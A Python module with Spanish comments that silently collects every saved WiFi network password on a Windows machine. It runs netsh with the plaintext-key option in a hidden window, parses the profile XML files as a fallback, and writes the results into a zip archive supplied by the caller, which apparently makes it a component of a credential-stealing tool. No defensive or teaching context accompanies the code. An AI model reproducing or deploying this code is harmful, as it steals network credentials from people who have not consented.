# language: Python 3, file: wifi_passwords.py, target: Windows 10/11
# Extrae contraseñas WiFi guardadas via netsh
# No requiere privilegios elevados (usuario estándar puede leer sus propios perfiles)
# También intenta leer XML de perfiles directamente si netsh falla

import os
import re
import subprocess
import xml.etree.ElementTree as ET
from pathlib import Path

WIFI_PROFILES_PATH = r"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"


def _netsh_get_profiles() -> list[str]:
    """Retorna lista de nombres de perfiles WiFi vía netsh."""
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000,  # CREATE_NO_WINDOW
            text=True,
            encoding='utf-8',
            errors='ignore',
            timeout=15
        )
        # "All User Profile     : NombreRed"
        profiles = re.findall(r":\s*(.+)$", out, re.MULTILINE)
        return [p.strip() for p in profiles if p.strip()]
    except Exception:
        return []


def _netsh_get_password(profile_name: str) -> str | None:
    """
    Extrae la contraseña de un perfil específico.
    'key=clear' muestra la clave en texto plano.
    """
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profile",
             f"name={profile_name}", "key=clear"],
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000,
            text=True,
            encoding='utf-8',
            errors='ignore',
            timeout=10
        )
        # "Key Content            : micontraseña"
        match = re.search(r"Key Content\s*:\s*(.+)$", out, re.MULTILINE)
        if match:
            return match.group(1).strip()
        return None
    except Exception:
        return None


def _netsh_get_profile_info(profile_name: str) -> dict:
    """Extrae info adicional del perfil: auth, cipher, SSID."""
    info = {
        "auth":   "Unknown",
        "cipher": "Unknown",
        "ssid":   profile_name,
    }
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profile", f"name={profile_name}", "key=clear"],
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000,
            text=True,
            encoding='utf-8',
            errors='ignore',
            timeout=10
        )
        auth   = re.search(r"Authentication\s*:\s*(.+)$", out, re.MULTILINE)
        cipher = re.search(r"Cipher\s*:\s*(.+)$", out, re.MULTILINE)
        ssid   = re.search(r"SSID name\s*:\s*\"?(.+?)\"?$", out, re.MULTILINE)

        if auth:   info["auth"]   = auth.group(1).strip()
        if cipher: info["cipher"] = cipher.group(1).strip()
        if ssid:   info["ssid"]   = ssid.group(1).strip()
    except Exception:
        pass
    return info


def _xml_fallback_passwords() -> list[dict]:
    """
    Fallback: lee XML de perfiles directamente desde ProgramData.
    Requiere acceso al directorio (admin o mismo usuario).
    Los XML contienen el PSK en <keyMaterial> — en texto plano para WPA2-Personal.
    """
    results = []
    if not os.path.exists(WIFI_PROFILES_PATH):
        return results

    try:
        ns = {'wlan': 'http://www.microsoft.com/networking/WLAN/profile/v1'}

        for root, _, files in os.walk(WIFI_PROFILES_PATH):
            for fname in files:
                if not fname.endswith('.xml'):
                    continue
                fpath = os.path.join(root, fname)
                try:
                    tree = ET.parse(fpath)
                    xml_root = tree.getroot()

                    # SSID
                    ssid_el = xml_root.find('.//wlan:SSID/wlan:name', ns)
                    ssid    = ssid_el.text if ssid_el is not None else 'Unknown'

                    # auth
                    auth_el = xml_root.find('.//wlan:authentication', ns)
                    auth    = auth_el.text if auth_el is not None else 'Unknown'

                    # PSK
                    key_el  = xml_root.find('.//wlan:keyMaterial', ns)
                    key     = key_el.text if key_el is not None else None

                    if key:
                        results.append({
                            "ssid":     ssid,
                            "auth":     auth,
                            "password": key,
                            "source":   "xml_direct"
                        })
                except Exception:
                    pass
    except Exception:
        pass

    return results


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

def WiFiPasswords(zip_file) -> int:
    """
    Extrae todas las contraseñas WiFi guardadas.
    Combina netsh + fallback XML directo.
    Retorna cantidad de redes con contraseña encontrada.
    """
    results     = []
    seen_ssids  = set()

    # método primario: netsh
    profiles = _netsh_get_profiles()
    for profile in profiles:
        if profile in seen_ssids:
            continue
        seen_ssids.add(profile)

        info = _netsh_get_profile_info(profile)
        pwd  = _netsh_get_password(profile)

        results.append({
            "ssid":     info["ssid"],
            "auth":     info["auth"],
            "cipher":   info["cipher"],
            "password": pwd or "[open/no password]",
            "source":   "netsh"
        })

    # fallback XML para redes no capturadas por netsh
    xml_results = _xml_fallback_passwords()
    for entry in xml_results:
        if entry["ssid"] not in seen_ssids:
            seen_ssids.add(entry["ssid"])
            results.append(entry)

    # formatear output
    if not results:
        zip_file.writestr("WiFi Passwords.txt", "No WiFi profiles found.")
        return 0

    lines = [f"WiFi Networks Found: {len(results)}\n{'='*40}\n"]
    count_with_pwd = 0

    for r in results:
        has_pwd = r["password"] not in ("[open/no password]", None, "")
        if has_pwd:
            count_with_pwd += 1

        lines.append(
            f"SSID         : {r.get('ssid', 'Unknown')}\n"
            f"  Auth       : {r.get('auth', 'Unknown')}\n"
            f"  Cipher     : {r.get('cipher', 'Unknown')}\n"
            f"  Password   : {r.get('password', '[none]')}\n"
            f"  Source     : {r.get('source', 'unknown')}\n"
        )

    zip_file.writestr(f"WiFi Passwords ({count_with_pwd}).txt", "\n".join(lines))
    return count_with_pwd
